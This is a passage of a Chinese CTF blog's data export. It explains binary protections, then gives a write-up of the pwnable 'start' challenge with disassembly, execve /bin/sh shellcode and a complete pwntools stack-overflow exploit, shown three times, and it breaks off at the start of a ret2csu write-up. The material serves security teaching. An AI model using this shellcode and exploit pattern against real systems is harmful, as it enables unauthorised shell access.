title=\"Canary\"></a>Canary</h2><p>Canary保护主要用于防护<strong>栈溢出</strong>的攻击。在函数执行前在栈中插入一段canary值，函数返回时验证canary的值是否一致来判断是否发生栈溢出。如果canary被修改，则程序停止运行，防止栈溢出覆盖函数返回地址。在push ebp(或rbp)后就将canary push入栈，因此如果要覆盖函数返回地址必须要先覆盖在其之前的ebp(或rbp)和canary。</p>\n<h2 id=\"PIE-ASLR\"><a href=\"#PIE-ASLR\" class=\"headerlink\" title=\"PIE/ASLR\"></a>PIE/ASLR</h2><p>PIE和ASLR保护主要用于防护<strong>ROP</strong>的攻击。PIE保护会使程序地址空间分布随机化（随机化代码段、数据段、bss段的基地址），即程序起始地址位置不确定。如果没开启PIE保护，则程序的起始地址是确定的（0x400000或0x804000）。ASLR保护会使程序加载地址随机化（随机化栈的基地址、libc的基地址、mmap的基地址、堆的基地址），增加找到攻击函数（如libc中的system）的难度。</p>\n<h2 id=\"FORTIFY\"><a href=\"#FORTIFY\" class=\"headerlink\" title=\"FORTIFY\"></a>FORTIFY</h2><p>FORTIFY保护主要用于防护<strong>格式化字符串</strong>的攻击。包含%n的格式化字符串不能位于程序内存中的可写地址（防止写入），当使用位置参数时，必须使用范围内的所有位置参数，如果使用%5$x，要先使用1$、2$、3$、4$（防止泄露）。</p>\n<h2 id=\"RELRO\"><a href=\"#RELRO\" class=\"headerlink\" title=\"RELRO\"></a>RELRO</h2><p>RELRO保护主要用于防护对<strong>GOT表</strong>的攻击。设置符号重定向表为只读并在程序启动时就解析并绑定所有动态符号，从而减少对GOT表的攻击。</p>"},{"title":"pwnable_start","date":"2023-01-02T11:54:26.000Z","_content":"\n没有C语言代码，是个汇编的程序，考察基础的汇编\n\n<!-- more -->\n\n查壳后发现32位保护都没开，在ida中程序是用汇编代码写的，只有简单的write和read功能。\n\n```asm\n\n.text:08048060                 push    esp\n.text:08048061                 push    offset _exit\n.text:08048066                 xor     eax, eax\n.text:08048068                 xor     ebx, ebx\n.text:0804806A                 xor     ecx, ecx\n.text:0804806C                 xor     edx, edx\n.text:0804806E                 push    3A465443h\n.text:08048073                 push    20656874h\n.text:08048078                 push    20747261h\n.text:0804807D                 push    74732073h\n.text:08048082                 push    2774654Ch\n.text:08048087                 mov     ecx, esp        ; addr\n.text:08048089                 mov     dl, 14h         ; len\n.text:0804808B                 mov     bl, 1           ; fd\n.text:0804808D                 mov     al, 4\n.text:0804808F                 int     80h             ; LINUX - sys_write\n.text:08048091                 xor     ebx, ebx\n.text:08048093                 mov     dl, 3Ch ; '<'\n.text:08048095                 mov     al, 3\n.text:08048097                 int     80h             ; LINUX - sys_read\n.text:08048099                 add     esp, 14h\n.text:0804809C                 retn\n\n```\n\n其实就是如下代码：\n\n```c\n\nwrite(1,addr,0x14)\nread(0,addr,0x3c)\n\n```\n\n明显的栈溢出，保护没开可以使用shellcode来get shell。不过pwntools自带的shellcode太长了，只能自己写shellcode。\n\n```python\nshellcode=asm(\n'''\n    xor ecx , ecx;\n    xor edx , edx;\n    push 0x0068732f;    #\\x00hs/\n    push 0x6e69622f;    #nib/\n    mov ebx , esp;\n    mov al , 0xb;\n    int 0x80\n'''\n)\n```\n\n有了shellcode之后，要让程序能够执行shellcode，为此我们需要得到一个栈上的地址，并合理的排布栈空间，让ret指令能跳转到shellcode。\n\n可以利用栈溢出，将返回地址覆盖为0x08048087，再次执行write指令，输出当前esp指向的内存，这也是一开始push进栈的esp，是当前esp的地址+0x4，由此我们可以得到一个栈地址。\n\n在这之后还会有一次read，会从当前esp指向的地方开始输入，由于最后有一个add esp 14h，我们可以知道0x14个字节后的位置会被ret指令pop eip，因此此处应该放置shellcode的**起始地址**，这个地址通过之前得到的栈地址和偏移计算出来。\n\n如果read开始输入的地址是x，那么我们之前得到的地址stack_addr是x+0x4，在x+0x14的地方放置shellcode的**起始地址**，shellcode被我们放置在x+0x18，紧跟着起始地址，因此起始地址应该是stack_addr+0x14。\n\n**push指令的小区别**\n\n一开始不太理解为什么是stack+0x14，后来查了一下资料，发现push指令执行时会有些区别。\n\n如果是push一个**立即数**，或**除了esp之外的寄存器**，那么push指令就相当于:\n\n```asm\nlea esp , dword ptr ds:[esp-0x4];   //把esp-0x4这个地址写到esp，即先移动esp\nmov dword ptr ds:[esp] , xxx;   //再在esp处写入数据\n```\n\npush会先移动esp，再把内容写入当前esp指向的位置。\n\n但如果是push esp，那么push指令就是：\n\n```asm\nmov dword ptr ds:[esp-0x4] , esp;   //将esp寄存器中存的地址写到esp-0x4的位置，先把esp的内容放到栈上\nlea esp , dword ptr ds:[esp-0x4];   //将esp-0x4这个地址写到esp，即移动esp\n```\n\npush会先将当前的esp写到esp-0x4，然后再移动esp，毕竟移动esp后再写到栈上好像没有什么意义，后面pop esp和没有pop一样。\n\nexp:\n\n```python\nfrom pwn import*\np=process('./start')\n#p=remote('node4.buuoj.cn',28732)\ncontext.arch='i386'\ncontext.log_level='debug'\npadding=0x14\n\ngdb.attach(p)\n\nshellcode=asm(\n'''\n    xor ecx , ecx;\n    xor edx , edx;\n    push 0x0068732f;\n    push 0x6e69622f;\n    mov ebx , esp;\n    mov al , 0xb;\n    int 0x80\n'''\n)\nprint(\"this is shellcode : \",shellcode)\np.recv()\npayload1='a'*padding+p32(0x08048087)\np.send(payload1)\nstack_addr=u32(p.recv(4))\nprint(\"this is the stack addr : \",hex(stack_addr))\n\npayload2='a'*padding+p32(stack_addr+0x14)+shellcode\np.send(payload2)\np.interactive()\n\n```\n","source":"_posts/pwnable_start.md","raw":"---\ntitle: pwnable_start\ndate: 2023-01-02 19:54:26\ncategories: \n- pwn_wp\ntags: \n- pwn\n- stackoverflow\n- asm\n\n---\n\n没有C语言代码，是个汇编的程序，考察基础的汇编\n\n<!-- more -->\n\n查壳后发现32位保护都没开，在ida中程序是用汇编代码写的，只有简单的write和read功能。\n\n```asm\n\n.text:08048060                 push    esp\n.text:08048061                 push    offset _exit\n.text:08048066                 xor     eax, eax\n.text:08048068                 xor     ebx, ebx\n.text:0804806A                 xor     ecx, ecx\n.text:0804806C                 xor     edx, edx\n.text:0804806E                 push    3A465443h\n.text:08048073                 push    20656874h\n.text:08048078                 push    20747261h\n.text:0804807D                 push    74732073h\n.text:08048082                 push    2774654Ch\n.text:08048087                 mov     ecx, esp        ; addr\n.text:08048089                 mov     dl, 14h         ; len\n.text:0804808B                 mov     bl, 1           ; fd\n.text:0804808D                 mov     al, 4\n.text:0804808F                 int     80h             ; LINUX - sys_write\n.text:08048091                 xor     ebx, ebx\n.text:08048093                 mov     dl, 3Ch ; '<'\n.text:08048095                 mov     al, 3\n.text:08048097                 int     80h             ; LINUX - sys_read\n.text:08048099                 add     esp, 14h\n.text:0804809C                 retn\n\n```\n\n其实就是如下代码：\n\n```c\n\nwrite(1,addr,0x14)\nread(0,addr,0x3c)\n\n```\n\n明显的栈溢出，保护没开可以使用shellcode来get shell。不过pwntools自带的shellcode太长了，只能自己写shellcode。\n\n```python\nshellcode=asm(\n'''\n    xor ecx , ecx;\n    xor edx , edx;\n    push 0x0068732f;    #\\x00hs/\n    push 0x6e69622f;    #nib/\n    mov ebx , esp;\n    mov al , 0xb;\n    int 0x80\n'''\n)\n```\n\n有了shellcode之后，要让程序能够执行shellcode，为此我们需要得到一个栈上的地址，并合理的排布栈空间，让ret指令能跳转到shellcode。\n\n可以利用栈溢出，将返回地址覆盖为0x08048087，再次执行write指令，输出当前esp指向的内存，这也是一开始push进栈的esp，是当前esp的地址+0x4，由此我们可以得到一个栈地址。\n\n在这之后还会有一次read，会从当前esp指向的地方开始输入，由于最后有一个add esp 14h，我们可以知道0x14个字节后的位置会被ret指令pop eip，因此此处应该放置shellcode的**起始地址**，这个地址通过之前得到的栈地址和偏移计算出来。\n\n如果read开始输入的地址是x，那么我们之前得到的地址stack_addr是x+0x4，在x+0x14的地方放置shellcode的**起始地址**，shellcode被我们放置在x+0x18，紧跟着起始地址，因此起始地址应该是stack_addr+0x14。\n\n**push指令的小区别**\n\n一开始不太理解为什么是stack+0x14，后来查了一下资料，发现push指令执行时会有些区别。\n\n如果是push一个**立即数**，或**除了esp之外的寄存器**，那么push指令就相当于:\n\n```asm\nlea esp , dword ptr ds:[esp-0x4];   //把esp-0x4这个地址写到esp，即先移动esp\nmov dword ptr ds:[esp] , xxx;   //再在esp处写入数据\n```\n\npush会先移动esp，再把内容写入当前esp指向的位置。\n\n但如果是push esp，那么push指令就是：\n\n```asm\nmov dword ptr ds:[esp-0x4] , esp;   //将esp寄存器中存的地址写到esp-0x4的位置，先把esp的内容放到栈上\nlea esp , dword ptr ds:[esp-0x4];   //将esp-0x4这个地址写到esp，即移动esp\n```\n\npush会先将当前的esp写到esp-0x4，然后再移动esp，毕竟移动esp后再写到栈上好像没有什么意义，后面pop esp和没有pop一样。\n\nexp:\n\n```python\nfrom pwn import*\np=process('./start')\n#p=remote('node4.buuoj.cn',28732)\ncontext.arch='i386'\ncontext.log_level='debug'\npadding=0x14\n\ngdb.attach(p)\n\nshellcode=asm(\n'''\n    xor ecx , ecx;\n    xor edx , edx;\n    push 0x0068732f;\n    push 0x6e69622f;\n    mov ebx , esp;\n    mov al , 0xb;\n    int 0x80\n'''\n)\nprint(\"this is shellcode : \",shellcode)\np.recv()\npayload1='a'*padding+p32(0x08048087)\np.send(payload1)\nstack_addr=u32(p.recv(4))\nprint(\"this is the stack addr : \",hex(stack_addr))\n\npayload2='a'*padding+p32(stack_addr+0x14)+shellcode\np.send(payload2)\np.interactive()\n\n```\n","slug":"pwnable_start","published":1,"updated":"2023-01-02T16:19:28.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czagf005i5oud00y64ixw","content":"<p>没有C语言代码，是个汇编的程序，考察基础的汇编</p>\n<span id=\"more\"></span>\n\n<p>查壳后发现32位保护都没开，在ida中程序是用汇编代码写的，只有简单的write和read功能。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">.text:08048060                 push    esp</span><br><span class=\"line\">.text:08048061                 push    offset _exit</span><br><span class=\"line\">.text:08048066                 xor     eax, eax</span><br><span class=\"line\">.text:08048068                 xor     ebx, ebx</span><br><span class=\"line\">.text:0804806A                 xor     ecx, ecx</span><br><span class=\"line\">.text:0804806C                 xor     edx, edx</span><br><span class=\"line\">.text:0804806E                 push    3A465443h</span><br><span class=\"line\">.text:08048073                 push    20656874h</span><br><span class=\"line\">.text:08048078                 push    20747261h</span><br><span class=\"line\">.text:0804807D                 push    74732073h</span><br><span class=\"line\">.text:08048082                 push    2774654Ch</span><br><span class=\"line\">.text:08048087                 mov     ecx, esp        ; addr</span><br><span class=\"line\">.text:08048089                 mov     dl, 14h         ; len</span><br><span class=\"line\">.text:0804808B                 mov     bl, 1           ; fd</span><br><span class=\"line\">.text:0804808D                 mov     al, 4</span><br><span class=\"line\">.text:0804808F                 int     80h             ; LINUX - sys_write</span><br><span class=\"line\">.text:08048091                 xor     ebx, ebx</span><br><span class=\"line\">.text:08048093                 mov     dl, 3Ch ; &#x27;&lt;&#x27;</span><br><span class=\"line\">.text:08048095                 mov     al, 3</span><br><span class=\"line\">.text:08048097                 int     80h             ; LINUX - sys_read</span><br><span class=\"line\">.text:08048099                 add     esp, 14h</span><br><span class=\"line\">.text:0804809C                 retn</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>其实就是如下代码：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">write(<span class=\"number\">1</span>,addr,<span class=\"number\">0x14</span>)</span><br><span class=\"line\">read(<span class=\"number\">0</span>,addr,<span class=\"number\">0x3c</span>)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>明显的栈溢出，保护没开可以使用shellcode来get shell。不过pwntools自带的shellcode太长了，只能自己写shellcode。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shellcode=asm(</span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">    xor ecx , ecx;</span></span><br><span class=\"line\"><span class=\"string\">    xor edx , edx;</span></span><br><span class=\"line\"><span class=\"string\">    push 0x0068732f;    #\\x00hs/</span></span><br><span class=\"line\"><span class=\"string\">    push 0x6e69622f;    #nib/</span></span><br><span class=\"line\"><span class=\"string\">    mov ebx , esp;</span></span><br><span class=\"line\"><span class=\"string\">    mov al , 0xb;</span></span><br><span class=\"line\"><span class=\"string\">    int 0x80</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\">)</span><br></pre></td></tr></table></figure>\n\n<p>有了shellcode之后，要让程序能够执行shellcode，为此我们需要得到一个栈上的地址，并合理的排布栈空间，让ret指令能跳转到shellcode。</p>\n<p>可以利用栈溢出，将返回地址覆盖为0x08048087，再次执行write指令，输出当前esp指向的内存，这也是一开始push进栈的esp，是当前esp的地址+0x4，由此我们可以得到一个栈地址。</p>\n<p>在这之后还会有一次read，会从当前esp指向的地方开始输入，由于最后有一个add esp 14h，我们可以知道0x14个字节后的位置会被ret指令pop eip，因此此处应该放置shellcode的<strong>起始地址</strong>，这个地址通过之前得到的栈地址和偏移计算出来。</p>\n<p>如果read开始输入的地址是x，那么我们之前得到的地址stack_addr是x+0x4，在x+0x14的地方放置shellcode的<strong>起始地址</strong>，shellcode被我们放置在x+0x18，紧跟着起始地址，因此起始地址应该是stack_addr+0x14。</p>\n<p><strong>push指令的小区别</strong></p>\n<p>一开始不太理解为什么是stack+0x14，后来查了一下资料，发现push指令执行时会有些区别。</p>\n<p>如果是push一个<strong>立即数</strong>，或<strong>除了esp之外的寄存器</strong>，那么push指令就相当于:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lea esp , dword ptr ds:[esp-0x4];   //把esp-0x4这个地址写到esp，即先移动esp</span><br><span class=\"line\">mov dword ptr ds:[esp] , xxx;   //再在esp处写入数据</span><br></pre></td></tr></table></figure>\n\n<p>push会先移动esp，再把内容写入当前esp指向的位置。</p>\n<p>但如果是push esp，那么push指令就是：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov dword ptr ds:[esp-0x4] , esp;   //将esp寄存器中存的地址写到esp-0x4的位置，先把esp的内容放到栈上</span><br><span class=\"line\">lea esp , dword ptr ds:[esp-0x4];   //将esp-0x4这个地址写到esp，即移动esp</span><br></pre></td></tr></table></figure>\n\n<p>push会先将当前的esp写到esp-0x4，然后再移动esp，毕竟移动esp后再写到栈上好像没有什么意义，后面pop esp和没有pop一样。</p>\n<p>exp:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">p=process(<span class=\"string\">&#x27;./start&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#p=remote(&#x27;node4.buuoj.cn&#x27;,28732)</span></span><br><span class=\"line\">context.arch=<span class=\"string\">&#x27;i386&#x27;</span></span><br><span class=\"line\">context.log_level=<span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">padding=<span class=\"number\">0x14</span></span><br><span class=\"line\"></span><br><span class=\"line\">gdb.attach(p)</span><br><span class=\"line\"></span><br><span class=\"line\">shellcode=asm(</span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">    xor ecx , ecx;</span></span><br><span class=\"line\"><span class=\"string\">    xor edx , edx;</span></span><br><span class=\"line\"><span class=\"string\">    push 0x0068732f;</span></span><br><span class=\"line\"><span class=\"string\">    push 0x6e69622f;</span></span><br><span class=\"line\"><span class=\"string\">    mov ebx , esp;</span></span><br><span class=\"line\"><span class=\"string\">    mov al , 0xb;</span></span><br><span class=\"line\"><span class=\"string\">    int 0x80</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\">)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;this is shellcode : &quot;</span>,shellcode)</span><br><span class=\"line\">p.recv()</span><br><span class=\"line\">payload1=<span class=\"string\">&#x27;a&#x27;</span>*padding+p32(<span class=\"number\">0x08048087</span>)</span><br><span class=\"line\">p.send(payload1)</span><br><span class=\"line\">stack_addr=u32(p.recv(<span class=\"number\">4</span>))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;this is the stack addr : &quot;</span>,<span class=\"built_in\">hex</span>(stack_addr))</span><br><span class=\"line\"></span><br><span class=\"line\">payload2=<span class=\"string\">&#x27;a&#x27;</span>*padding+p32(stack_addr+<span class=\"number\">0x14</span>)+shellcode</span><br><span class=\"line\">p.send(payload2)</span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"<p>没有C语言代码，是个汇编的程序，考察基础的汇编</p>","more":"<p>查壳后发现32位保护都没开，在ida中程序是用汇编代码写的，只有简单的write和read功能。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">.text:08048060                 push    esp</span><br><span class=\"line\">.text:08048061                 push    offset _exit</span><br><span class=\"line\">.text:08048066                 xor     eax, eax</span><br><span class=\"line\">.text:08048068                 xor     ebx, ebx</span><br><span class=\"line\">.text:0804806A                 xor     ecx, ecx</span><br><span class=\"line\">.text:0804806C                 xor     edx, edx</span><br><span class=\"line\">.text:0804806E                 push    3A465443h</span><br><span class=\"line\">.text:08048073                 push    20656874h</span><br><span class=\"line\">.text:08048078                 push    20747261h</span><br><span class=\"line\">.text:0804807D                 push    74732073h</span><br><span class=\"line\">.text:08048082                 push    2774654Ch</span><br><span class=\"line\">.text:08048087                 mov     ecx, esp        ; addr</span><br><span class=\"line\">.text:08048089                 mov     dl, 14h         ; len</span><br><span class=\"line\">.text:0804808B                 mov     bl, 1           ; fd</span><br><span class=\"line\">.text:0804808D                 mov     al, 4</span><br><span class=\"line\">.text:0804808F                 int     80h             ; LINUX - sys_write</span><br><span class=\"line\">.text:08048091                 xor     ebx, ebx</span><br><span class=\"line\">.text:08048093                 mov     dl, 3Ch ; &#x27;&lt;&#x27;</span><br><span class=\"line\">.text:08048095                 mov     al, 3</span><br><span class=\"line\">.text:08048097                 int     80h             ; LINUX - sys_read</span><br><span class=\"line\">.text:08048099                 add     esp, 14h</span><br><span class=\"line\">.text:0804809C                 retn</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>其实就是如下代码：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">write(<span class=\"number\">1</span>,addr,<span class=\"number\">0x14</span>)</span><br><span class=\"line\">read(<span class=\"number\">0</span>,addr,<span class=\"number\">0x3c</span>)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>明显的栈溢出，保护没开可以使用shellcode来get shell。不过pwntools自带的shellcode太长了，只能自己写shellcode。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shellcode=asm(</span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">    xor ecx , ecx;</span></span><br><span class=\"line\"><span class=\"string\">    xor edx , edx;</span></span><br><span class=\"line\"><span class=\"string\">    push 0x0068732f;    #\\x00hs/</span></span><br><span class=\"line\"><span class=\"string\">    push 0x6e69622f;    #nib/</span></span><br><span class=\"line\"><span class=\"string\">    mov ebx , esp;</span></span><br><span class=\"line\"><span class=\"string\">    mov al , 0xb;</span></span><br><span class=\"line\"><span class=\"string\">    int 0x80</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\">)</span><br></pre></td></tr></table></figure>\n\n<p>有了shellcode之后，要让程序能够执行shellcode，为此我们需要得到一个栈上的地址，并合理的排布栈空间，让ret指令能跳转到shellcode。</p>\n<p>可以利用栈溢出，将返回地址覆盖为0x08048087，再次执行write指令，输出当前esp指向的内存，这也是一开始push进栈的esp，是当前esp的地址+0x4，由此我们可以得到一个栈地址。</p>\n<p>在这之后还会有一次read，会从当前esp指向的地方开始输入，由于最后有一个add esp 14h，我们可以知道0x14个字节后的位置会被ret指令pop eip，因此此处应该放置shellcode的<strong>起始地址</strong>，这个地址通过之前得到的栈地址和偏移计算出来。</p>\n<p>如果read开始输入的地址是x，那么我们之前得到的地址stack_addr是x+0x4，在x+0x14的地方放置shellcode的<strong>起始地址</strong>，shellcode被我们放置在x+0x18，紧跟着起始地址，因此起始地址应该是stack_addr+0x14。</p>\n<p><strong>push指令的小区别</strong></p>\n<p>一开始不太理解为什么是stack+0x14，后来查了一下资料，发现push指令执行时会有些区别。</p>\n<p>如果是push一个<strong>立即数</strong>，或<strong>除了esp之外的寄存器</strong>，那么push指令就相当于:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lea esp , dword ptr ds:[esp-0x4];   //把esp-0x4这个地址写到esp，即先移动esp</span><br><span class=\"line\">mov dword ptr ds:[esp] , xxx;   //再在esp处写入数据</span><br></pre></td></tr></table></figure>\n\n<p>push会先移动esp，再把内容写入当前esp指向的位置。</p>\n<p>但如果是push esp，那么push指令就是：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov dword ptr ds:[esp-0x4] , esp;   //将esp寄存器中存的地址写到esp-0x4的位置，先把esp的内容放到栈上</span><br><span class=\"line\">lea esp , dword ptr ds:[esp-0x4];   //将esp-0x4这个地址写到esp，即移动esp</span><br></pre></td></tr></table></figure>\n\n<p>push会先将当前的esp写到esp-0x4，然后再移动esp，毕竟移动esp后再写到栈上好像没有什么意义，后面pop esp和没有pop一样。</p>\n<p>exp:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">p=process(<span class=\"string\">&#x27;./start&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#p=remote(&#x27;node4.buuoj.cn&#x27;,28732)</span></span><br><span class=\"line\">context.arch=<span class=\"string\">&#x27;i386&#x27;</span></span><br><span class=\"line\">context.log_level=<span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">padding=<span class=\"number\">0x14</span></span><br><span class=\"line\"></span><br><span class=\"line\">gdb.attach(p)</span><br><span class=\"line\"></span><br><span class=\"line\">shellcode=asm(</span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">    xor ecx , ecx;</span></span><br><span class=\"line\"><span class=\"string\">    xor edx , edx;</span></span><br><span class=\"line\"><span class=\"string\">    push 0x0068732f;</span></span><br><span class=\"line\"><span class=\"string\">    push 0x6e69622f;</span></span><br><span class=\"line\"><span class=\"string\">    mov ebx , esp;</span></span><br><span class=\"line\"><span class=\"string\">    mov al , 0xb;</span></span><br><span class=\"line\"><span class=\"string\">    int 0x80</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\">)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;this is shellcode : &quot;</span>,shellcode)</span><br><span class=\"line\">p.recv()</span><br><span class=\"line\">payload1=<span class=\"string\">&#x27;a&#x27;</span>*padding+p32(<span class=\"number\">0x08048087</span>)</span><br><span class=\"line\">p.send(payload1)</span><br><span class=\"line\">stack_addr=u32(p.recv(<span class=\"number\">4</span>))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;this is the stack addr : &quot;</span>,<span class=\"built_in\">hex</span>(stack_addr))</span><br><span class=\"line\"></span><br><span class=\"line\">payload2=<span class=\"string\">&#x27;a&#x27;</span>*padding+p32(stack_addr+<span class=\"number\">0x14</span>)+shellcode</span><br><span class=\"line\">p.send(payload2)</span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>"},{"title":"ret2csu1","date":"2023-01-02T11:54:26.000Z","_content":"NewStar，ret2csu\n\n<!--more-->\n\n64位栈溢出，保护都只开了NX，message大小为0x20却可以输入0x70。\n\n有一个后门，但是参数不对，可以尝试栈溢出修改寄存器的值后再调用execve。\n\n```c\nvoid __cdecl ohMyBackdoor(__int64_t a, __int64_t b, __int64_t c)\n{\n  signed __int64 v3; // rax\n\n  if ( a == 'Fallw1nd' && b == 'WantsAGI' && c == 'rlfriend' )\n    v3 = sys_execve((const char *)'Fallw1nd', (const char *const *)b, (const char *const *)'rlfriend');\n}\n```\n\n要修改三个参数不太容易，要用到__libc_csu_init中的gadget。\n\n```c\n0x0000000000400710 <+64>: mov    rdx,r15\n0x0000000000400713 <+67>: mov    rsi,r14\n0x0000000000400716 <+70>: mov    edi,r13d\n0x0000000000400719 <+73>: call   QWORD PTR [r12+rbx*8]\n0x000000000040071d <+77>: add    rbx,0x1\n0x0000000000400721 <+81>: cmp    